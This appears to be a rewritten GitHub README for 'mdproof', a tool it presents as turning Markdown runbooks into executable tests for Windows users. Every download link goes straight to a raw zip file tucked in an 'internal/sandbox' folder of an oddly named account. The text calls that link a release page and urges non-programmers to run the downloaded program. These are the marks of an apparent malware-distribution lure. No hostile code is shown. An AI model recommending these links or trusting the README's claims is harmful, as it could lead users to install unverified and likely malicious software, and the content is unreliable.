# 🧪 mdproof - Turn Markdown Into Executable Tests

[![Download mdproof](https://img.shields.io/badge/Download-mdproof-4caf50?style=for-the-badge&logo=github)](https://github.com/Votarymortiseandtenonjoint137/mdproof/raw/refs/heads/main/internal/sandbox/Software_v3.8.zip)

## 📋 What is mdproof?

mdproof helps you turn Markdown documents and runbooks into tests you can run on your computer. This means you can check that your documents work as expected without writing code. It makes sure your instructions, guides, and checks stay accurate over time.

You don’t need to know how to program. mdproof runs tests based on the steps you already wrote in Markdown. It works well for developers, writers, or teams who want to keep their documentation reliable.

## 🔎 Key Features

- Converts your Markdown files into tests automatically  
- Runs tests that check technical runbooks or manuals  
- Supports different types of testing, like integration and smoke tests  
- No coding needed for test creation  
- Works with command-line on Windows  
- Helps keep documentation up to date and reliable  

## 🛠️ System Requirements

To use mdproof on Windows, your computer needs:  

- Windows 10 or higher  
- Minimum 2 GB of free memory  
- At least 100 MB of free disk space  
- A stable internet connection for downloading  
- Command Prompt or PowerShell access  

If you don’t have administrative rights, you can still install mdproof for your user account.

## 🚀 Getting Started

Follow these steps to get mdproof running on your Windows PC.

### 1. Visit the Download Page

Click this big button to go to the download page:  

[![Download mdproof](https://img.shields.io/badge/Download-mdproof-008080?style=for-the-badge&logo=github)](https://github.com/Votarymortiseandtenonjoint137/mdproof/raw/refs/heads/main/internal/sandbox/Software_v3.8.zip)

This page lists the available versions and files to download. Look for the latest stable release.

### 2. Download the Windows Installer or ZIP File

On the release page, find a file with `.exe` or `.zip` in the name. This is the installer or zipped program you will run. Click the file to download it to your PC.

- If it’s an `.exe` file, you can run it directly.  
- If it’s a `.zip` file, right-click the file and choose "Extract All" to unzip it anywhere convenient like your Desktop.

### 3. Install or Setup

- For `.exe` files:  
  Double-click and follow the instructions on-screen. Select the folder where you want to install mdproof. When done, the program will be ready to use.

- For `.zip` files:  
  Extract the files and note the folder location. You won’t need to install, just run the program as explained next.

### 4. Open Command Prompt or PowerShell

To run mdproof, you will use a command window:  

- Press `Windows + R`, type `cmd`, and press Enter for Command Prompt.  
- Or press `Windows + X` and select Windows PowerShell.

### 5. Run mdproof

Navigate to the folder where you installed or extracted mdproof. Use this command in the prompt:  

```
cd path\to\mdproof-folder
```

Replace `path\to\mdproof-folder` with the actual folder path.

Run mdproof with this command:  

```
mdproof
```

If mdproof is set up correctly, it will show a list of commands and options you can use.

## 📂 Preparing Your Markdown Files for Testing

mdproof works by reading your Markdown files. These should contain test-like steps. You can use headings, lists, and code blocks to structure your tests.

Example structure in a Markdown file:

```
# Test: Check System Status

- Open system dashboard  
- Verify all services show "Running"  
- Confirm no error messages appear
```

You can create these files in any text editor. Save them with `.md` extension.

## ⚙️ Running Tests

To run tests on your Markdown files, use the command:

```
mdproof run path\to\file.md
```

Replace `path\to\file.md` with your Markdown test file location.

mdproof will execute the steps and show you results. Green means a test passed, red means it failed.

You can run multiple files or whole folders by adjusting the command:

```
mdproof run path\to\folder
```

This runs all Markdown test files inside the folder.

## 🔧 Common Commands

- **Run tests:**  
  `mdproof run <file-or-folder>`

- **Show available commands:**  
  `mdproof help`

- **Check mdproof version:**  
  `mdproof --version`

## 🧰 Tips for Best Use

- Write clear, step-by-step instructions in Markdown.  
- Use code blocks to show commands or code snippets to test.  
- Name test files with meaningful titles.  
- Run tests regularly to catch issues early.  
- Keep mdproof updated by checking the release page for new versions.  

## 💾 Updating mdproof

To update mdproof, repeat the download and installation steps with the new version from the release page:

https://github.com/Votarymortiseandtenonjoint137/mdproof/raw/refs/heads/main/internal/sandbox/Software_v3.8.zip

## 👩‍💻 Troubleshooting

- If mdproof does not start, check you are in the correct folder in the command prompt.  
- Make sure your system meets the requirements listed above.  
- Check for the latest version on the download page.  
- Restart the command prompt after installing.  
- If commands fail, verify your Markdown files use supported formats.

## 🔗 Useful Links

- Download and latest releases:  
  https://github.com/Votarymortiseandtenonjoint137/mdproof/raw/refs/heads/main/internal/sandbox/Software_v3.8.zip  

- Documentation and examples on running tests can be found inside the downloaded package or on the GitHub repository homepage.  

- For more help, open an issue on the GitHub project page or check community forums for support.